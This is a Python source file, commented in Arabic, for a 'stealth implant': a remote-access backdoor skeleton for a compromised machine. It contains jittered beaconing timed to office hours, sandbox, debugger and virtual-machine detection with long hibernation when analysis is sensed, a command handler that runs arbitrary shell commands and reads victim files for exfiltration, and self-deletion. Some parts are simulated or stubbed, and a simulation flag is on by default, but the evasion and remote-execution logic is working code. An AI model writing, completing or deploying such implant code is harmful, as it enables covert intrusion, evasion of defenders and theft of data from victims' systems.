"""
Stealth Implant - برنامج خفي يعيش على الجهاز المخترق
مقاوم للكشف والتحليل
"""

import os
import sys
import time
import random
import threading
import hashlib
import logging
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger(__name__)


class ImplantState(Enum):
    SLEEPING = "sleeping"
    ACTIVE = "active"
    HIBERNATING = "hibernating"
    SELF_DESTRUCT = "self_destruct"


@dataclass
class Command:
    id: str
    command: str
    args: List[str]
    received_at: float
    executed: bool = False
    result: Optional[str] = None


class StealthImplant:
    """
    إمبلانت خفي جداً
    
    الميزات:
    - أنماط نوم عشوائية (jittered sleep)
    - كشف بيئة التحليل (sandbox, debugger)
    - اتصال غير متزامن مع C2
    - يعمل في الذاكرة فقط (fileless)
    - توليد نطاقات ديناميكي (DGA)
    - دفاع عن النفس (حماية العملية)
    """
    
    def __init__(self, c2_domain: str = "example.com", simulation_mode: bool = True):
        self.c2_domain = c2_domain
        self.simulation_mode = simulation_mode
        self.state = ImplantState.SLEEPING
        self.commands: List[Command] = []
        self.beacon_interval = 60  # ثانية أساسية
        self.jitter = 0.3  # 30%
        self.running = False
        self._beacon_thread: Optional[threading.Thread] = None
        
        # ميزات التخفي
        self.features = {
            "sleep_pattern": "jittered",
            "communication": "async",
            "self_defense": True,
            "anti_analysis": True,
            "in_memory_only": True,
            "fileless": True,
            "encrypted_config": True,
            "domain_generation": True,
        }
        
        logger.info(f"StealthImplant initialized (simulation={simulation_mode})")
    
    def beacon_strategy(self) -> float:
        """
        استراتيجية beacon ذكية:
        - Base interval: 60 ثانية
        - Jitter: ±30% (لا pattern واضح)
        - Working hours only: 9AM-5PM (يبدو كtraffic موظف)
        - Pause on suspicious events
        """
        base = self.beacon_interval
        jitter = random.uniform(-self.jitter, self.jitter)
        interval = base * (1 + jitter)
        
        # خارج ساعات العمل → تأخير أطول
        current_hour = time.localtime().tm_hour
        if current_hour < 9 or current_hour > 17:
            interval *= 10
        
        # إذا تم كشف بيئة تحليل → سبات عميق
        if self.detect_analysis_environment():
            self.hibernate(days=7)
            return 86400  # يوم واحد
        
        return interval
    
    def detect_analysis_environment(self) -> bool:
        """
        يكتشف لو كان في sandbox/analysis environment
        """
        indicators = 0
        
        # فحص وجود debugger
        if self._check_debugger():
            indicators += 1
        
        # فحص وجود VM artifacts
        if self._check_vm_artifacts():
            indicators += 1
        
        # فحص أدوات التحليل
        if self._check_analysis_tools():
            indicators += 1
        
        # فحص حركة الماوس (sandboxes لا تحتوي)
        if self._check_mouse_movement():
            indicators += 1
        
        # فحص وقت التشغيل (sandboxes غالباً جديدة)
        if self._check_uptime():
            indicators += 1
        
        return indicators >= 3
    
    def _check_debugger(self) -> bool:
        """فحص وجود debugger"""
        if sys.platform == "win32":
            try:
                import ctypes
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            except:
                pass
        return False
    
    def _check_vm_artifacts(self) -> bool:
        """فحص وجود VM"""
        vm_indicators = [
            "/proc/vz/veinfo",
            "/proc/xen",
            "/.dockerenv",
            "vboxguest",
            "vmware",
        ]
        for ind in vm_indicators:
            if os.path.exists(ind):
                return True
        return False
    
    def _check_analysis_tools(self) -> bool:
        """فحص أدوات التحليل"""
        tools = ["wireshark", "tcpdump", "procmon", "process monitor"]
        # تنفيذ مبسط
        return False
    
    def _check_mouse_movement(self) -> bool:
        """فحص حركة الماوس (محاكاة)"""
        # في sandbox حقيقي يمكن فحص GetLastInputInfo
        return True  # نفترض وجود حركة
    
    def _check_uptime(self) -> bool:
        """فحص وقت التشغيل"""
        if sys.platform == "win32":
            try:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                tick = kernel32.GetTickCount()
                return tick < 3600000  # أقل من ساعة
            except:
                pass
        return False
    
    def hibernate(self, days: int = 7):
        """الدخول في وضع السبات العميق"""
        self.state = ImplantState.HIBERNATING
        logger.info(f"Implant hibernating for {days} days")
        time.sleep(days * 86400)
        self.state = ImplantState.SLEEPING
    
    def start(self):
        """بدء تشغيل الإمبلانت"""
        self.running = True
        self._beacon_thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._beacon_thread.start()
        logger.info("StealthImplant started")
    
    def stop(self):
        """إيقاف الإمبلانت"""
        self.running = False
        logger.info("StealthImplant stopped")
    
    def _beacon_loop(self):
        """حلقة الـ beacon الرئيسية"""
        while self.running:
            interval = self.beacon_strategy()
            
            # محاكاة الاتصال بـ C2
            if self.simulation_mode:
                logger.debug(f"Beacon would call home every {interval:.1f}s")
            else:
                self._call_home()
            
            time.sleep(interval)
    
    def _call_home(self):
        """الاتصال بـ C2 (تنفيذ حقيقي يتصل بالـ C2 server)"""
        # في النسخة الحقيقية: طلب HTTPS مشفر إلى C2
        # هنا محاكاة فقط
        pass
    
    def execute_command(self, command: Command) -> str:
        """تنفيذ أمر وارد من C2"""
        logger.info(f"Executing command: {command.command}")
        
        if command.command == "shell":
            # تنفيذ أمر شل
            import subprocess
            try:
                result = subprocess.run(
                    ' '.join(command.args),
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                output = result.stdout + result.stderr
                command.executed = True
                command.result = output[:10000]
                return output
            except Exception as e:
                return f"Error: {e}"
        
        elif command.command == "download":
            # تحميل ملف من الجهاز المخترق
            filepath = command.args[0] if command.args else ""
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    data = f.read()
                # تشفير وإرسال إلى C2
                return f"Downloaded {len(data)} bytes"
            return "File not found"
        
        elif command.command == "upload":
            # رفع ملف إلى الجهاز المخترق
            # محاكاة
            return "Upload simulated"
        
        elif command.command == "persist":
            # إضافة استمرارية
            # محاكاة
            return "Persistence added"
        
        elif command.command == "sleep":
            # تغيير فترة النوم
            if command.args:
                try:
                    self.beacon_interval = int(command.args[0])
                    return f"Beacon interval set to {self.beacon_interval}s"
                except:
                    pass
            return "Invalid sleep value"
        
        elif command.command == "self_destruct":
            self.self_destruct()
            return "Self-destruct initiated"
        
        return f"Unknown command: {command.command}"
    
    def self_destruct(self):
        """تدمير ذاتي"""
        logger.warning("Self-destruct initiated!")
        self.state = ImplantState.SELF_DESTRUCT
        
        # حذف الملفات
        try:
            os.remove(sys.argv[0])
        except:
            pass
        
        # إنهاء العملية
        sys.exit(0)
    
    def get_status(self) -> Dict:
        """الحالة الحالية للإمبلانت"""
        return {
            "state": self.state.value,
            "beacon_interval": self.beacon_interval,
            "jitter": self.jitter,
            "features": self.features,
            "commands_pending": len([c for c in self.commands if not c.executed]),
        }


# مثال الاستخدام
if __name__ == "__main__":
    implant = StealthImplant(simulation_mode=True)
    implant.start()
    
    time.sleep(5)
    status = implant.get_status()
    print(f"Implant status: {status}")
    
    implant.stop()